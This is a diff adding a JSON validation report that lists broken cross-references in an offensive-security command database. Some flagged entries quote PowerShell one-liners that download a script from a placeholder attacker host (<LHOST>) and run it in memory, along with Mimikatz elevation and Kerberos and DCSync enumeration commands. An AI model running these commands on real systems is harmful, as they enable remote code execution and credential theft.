@@ -1,0 +1,469 @@
+{
+  "violations": [
+    {
+      "file": "data/commands/file-transfer/file-verification.json",
+      "command_id": "ft-file-verify-md5",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "sha256sum <FILE> (SHA-256, more secure but slower)",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/file-transfer/file-verification.json",
+      "command_id": "ft-file-verify-md5",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "Get-FileHash <FILE> (PowerShell on Windows)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "powershell-download",
+        "powershell-runas-output-redirect",
+        "powershell-invoke-webrequest",
+        "powershell-ep-bypass-flag",
+        "powershell-get-content"
+      ]
+    },
+    {
+      "file": "data/commands/file-transfer/file-verification.json",
+      "command_id": "ft-file-verify-md5",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "certutil -hashfile <FILE> MD5 (Windows built-in)",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/file-transfer/file-verification.json",
+      "command_id": "ft-powershell-execute-memory",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "IWR -Uri http://<LHOST>/<SCRIPT>.ps1 -UseBasicParsing | IEX (PowerShell 3.0+)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "ps-find-new-domain-admin",
+        "ps-sort-memory",
+        "ps-reverse-shell-encoder-python",
+        "ps-get-group-members-basic",
+        "ps-pid-details"
+      ]
+    },
+    {
+      "file": "data/commands/file-transfer/file-verification.json",
+      "command_id": "ft-powershell-execute-memory",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1') | IEX (explicit pipe)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "ps-find-new-domain-admin",
+        "ps-sort-memory",
+        "ps-reverse-shell-encoder-python",
+        "ps-get-group-members-basic",
+        "ps-pid-details"
+      ]
+    },
+    {
+      "file": "data/commands/file-transfer/file-verification.json",
+      "command_id": "ft-powershell-execute-memory",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "IEX (Get-Content \\\\<LHOST>\\share\\script.ps1 -Raw) (SMB-based)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "ps-find-new-domain-admin",
+        "ps-sort-memory",
+        "ps-reverse-shell-encoder-python",
+        "ps-get-group-members-basic",
+        "ps-pid-details"
+      ]
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "systemctl-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "systemctl-status-service",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "systemctl-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "systemctl-show-service",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "systemctl-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "find-writable-service-files",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "systemctl-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "linux-process-enumeration",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "systemctl-list",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "service --status-all",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "systemctl-list",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "chkconfig --list",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "lsof-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "curl-local-service",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "lsof-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "port-forward-ssh",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "lsof-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "chisel-port-forward",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "lsof-list",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "linux-process-enumeration",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "lsof-list",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "netstat -tulpn",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "lsof-list",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "ss -tulpn",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/monitoring/linux-process-monitoring.json",
+      "command_id": "lsof-list",
+      "field": "alternatives",
+      "violation_type": "broken_reference",
+      "text": "netstat-listening-ports",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/active-directory/ad-golden-ticket.json",
+      "command_id": "ad-golden-ticket-verify-klist",
+      "field": "alternatives",
+      "violation_type": "broken_reference",
+      "text": "rubeus-klist-display",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/active-directory/ad-credential-validation.json",
+      "command_id": "crackmapexec-validate-admin",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "psexec",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/active-directory/ad-credential-validation.json",
+      "command_id": "crackmapexec-validate-admin",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "smbexec",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/active-directory/ad-credential-validation.json",
+      "command_id": "crackmapexec-validate-admin",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "wmiexec",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/active-directory/ad-credential-validation.json",
+      "command_id": "crackmapexec-validate-admin",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "secretsdump",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/active-directory/ad-credential-extraction.json",
+      "command_id": "ad-lsass-dump-procdump",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "windows-smb-exfiltrate-file",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/active-directory/ad-credential-extraction.json",
+      "command_id": "ad-sam-dump-reg-save",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "windows-smb-exfiltrate-file",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-password-and-access.json",
+      "command_id": "windows-hashcat-crack-ntlm",
+      "field": "alternatives",
+      "violation_type": "broken_reference",
+      "text": "john-crack-ntlm",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-password-and-access.json",
+      "command_id": "windows-hashcat-crack-ntlm-file",
+      "field": "alternatives",
+      "violation_type": "broken_reference",
+      "text": "john-crack-ntlm-rules",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-powershell-cmdlets.json",
+      "command_id": "get-ciminstance",
+      "field": "alternatives",
+      "violation_type": "broken_reference",
+      "text": "get-wmiobject",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "windows-screenshot-capture",
+      "field": "next_steps",
+      "violation_type": "broken_reference",
+      "text": "windows-smb-exfiltrate-file",
+      "confidence": "broken",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "windows-net-use-smb-connect",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "pushd \\\\\\\\<TARGET>\\\\<SHARE> (temporary mapping, auto-disconnects)",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "windows-net-use-smb-connect",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\\\\\<TARGET>\\\\<SHARE> -Credential $cred (PowerShell)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "ps-find-new-domain-admin",
+        "ps-sort-memory",
+        "ps-reverse-shell-encoder-python",
+        "ps-get-group-members-basic",
+        "ps-pid-details"
+      ]
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "kerberos-klist-purge",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "mimikatz.exe \"kerberos::purge\" \"exit\" (Mimikatz alternative)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "mimikatz-sekurlsa-logonpasswords",
+        "mimikatz-privilege-debug",
+        "mimikatz-sekurlsa-tickets-export"
+      ]
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "kerberos-klist-purge",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "Rubeus.exe purge (Rubeus alternative)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "rubeus-ptt",
+        "rubeus-kerberoast-aes",
+        "rubeus-kerberoast",
+        "rubeus-asreproast"
+      ]
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "windows-psexec-system-shell",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"exit\" (Mimikatz token elevation)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "mimikatz-sekurlsa-logonpasswords",
+        "mimikatz-privilege-debug",
+        "mimikatz-sekurlsa-tickets-export"
+      ]
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "windows-psexec-system-shell",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "Start-Process cmd.exe -Verb RunAs (PowerShell elevation, requires GUI)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "powershell-download",
+        "powershell-runas-output-redirect",
+        "powershell-invoke-webrequest",
+        "powershell-ep-bypass-flag",
+        "powershell-get-content"
+      ]
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "powerview-enumerate-spns",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} (ActiveDirectory module)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "nc-listener-setup",
+        "nc-file-transfer",
+        "nc-listener-tcp",
+        "nc-connect",
+        "nc-listener-non-staged"
+      ]
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "powerview-enumerate-spns",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "setspn -T <DOMAIN> -Q */* (Windows built-in)",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "powerview-enumerate-spns",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "GetUserSPNs.py <DOMAIN>/<USER>:<PASS> (Impacket from Kali)",
+      "confidence": "fuzzy",
+      "candidates": [
+        "impacket-getnpusers-identify",
+        "impacket-secretsdump",
+        "impacket-psexec",
+        "impacket-smbserver",
+        "impacket-smbexec"
+      ]
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "ad-dcsync-check-privileges",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -like '*Replication*'} (ActiveDirectory module)",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/post-exploit/windows-post-exploitation.json",
+      "command_id": "ad-dcsync-check-privileges",
+      "field": "alternatives",
+      "violation_type": "text_instead_of_id",
+      "text": "adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor (ADFind tool)",
+      "confidence": "missing",
+      "candidates": []
+    },
+    {
+      "file": "data/commands/exploitation/metasploit-meterpreter.json",
+      "command_id": "meterpreter-getsystem",
+      "field": "alternatives",
+      "violation_type": "broken_reference",
+      "text": "windows-exploit-suggester",
+      "confidence": "broken",
+      "candidates": []
+    }
+  ],
+  "stats": {
+    "total_commands": 1256,
+    "total_violations": 42,
+    "fields": {
+      "next_steps": {
+        "text_count": 0,
+        "id_count": 581,
+        "commands_with_field": 921
+      },
+      "alternatives": {
+        "text_count": 21,
+        "id_count": 749,
+        "commands_with_field": 895
+      },
+      "prerequisites": {
+        "text_count": 0,
+        "id_count": 330,
+        "commands_with_field": 630
+      }
+    },
+    "categories": {
+      "direct": 0,
+      "fuzzy": 11,
+      "missing": 10
+    }
+  }
+}
